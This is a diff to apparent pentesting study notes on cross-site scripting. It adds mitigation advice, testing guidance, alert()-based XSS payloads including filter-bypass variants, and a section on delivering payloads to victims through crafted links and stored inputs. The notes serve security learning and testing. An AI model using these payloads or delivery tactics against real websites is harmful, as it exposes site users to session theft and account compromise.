@@ -26,6 +26,11 @@ Mitigation of XSS Attacks:
 - Encode data on output: At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
 - Use appropriate response headers: To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
 - Content Security Policy: As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
+- Output encoding based on context (HTML, attribute, JavaScript, URL, CSS).
+- Content Security Policy (CSP) with script-src to whitelist trusted sources.
+- Use safe JavaScript APIs like textContent instead of innerHTML.
+- Sanitize user input with libraries like DOMPurify when HTML is needed.
+- Enable HttpOnly and Secure flags for cookies.
 - JavaScript:
     - Avoid dangerous JavaScript functions like eval(), Function(), setTimeout()/setInterval() with string arguments, document.write() — these increase XSS risk.
     - Set HttpOnly and Secure flags on cookies to prevent JavaScript access to sensitive cookies.
@@ -33,6 +38,7 @@ Mitigation of XSS Attacks:
 
 Test/Check:
 - Reflected:
+    - User-controlled data: URL parameters, POST body, HTTP Headers (User-Agent, Referer), cookies, file uploads, and client-side storage
     - Test every entry point: submit random alphanumeric values, determine the reflection context
     - Study JS, jQuery code by inspecting and Check for input validation and sanitization
     - Use line and string breaks with comments, close previous tags/query
@@ -40,8 +46,11 @@ Test/Check:
     - Burp Intruder with testing all allowed tags and events
     - Payloads:
         - <script>alert(1)</script>
+        - <img src=x onerror=alert(1)>
+        - <svg onload=alert(1)>
         - javascript:alert(1)
         - `${alert(1)}` (evaluate in backticks)
+        - <a href="#" onclick="alert('stored')">Click</a>
         - <svg><animatetransform onbegin=alert(1)></svg>
         - \"-alert(1)}// (skip/bypass validation)
         - <link rel="canonical" href="https://test.com/?" accesskey="x" onclick="alert(1)"> (cononical link tag)
@@ -50,6 +59,7 @@ Test/Check:
         - <svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click me</text></a>'</svg> (blocked tags/attributes)
         - URL Encoded: %22%3E%3Cimg%20src=x%20onerror=prompt(1);%3E
 - DOM Based:
+    - Look for location.hash, document.referer, window.name, and javascript sinks like innerHTML, eval(), document.write()
     - Test with Elements that support onload/onerror:
         - <script>alert(1)</script>
         - <svg onload=alert(1)>
@@ -68,3 +78,8 @@ Test/Check:
         - <a href="#" onclick="alert('stored')">Click</a>
         - <svg/onload=alert('stored')>
         - http://foo?&apos;-alert(1)-&apos; (anchor onclick)
+
+Delivery Methods
+- Reflected: Craft a malicious URL and trick the victim into clicking it (e.g. via email, link shortening, social engineering).
+- Stored: Submit the payload to a persistent input (comment, profile, message). The payload executes for every user who views that page.
+- DOM-based: Deliver a specially crafted URL containing the payload in the hash or other client-side source.
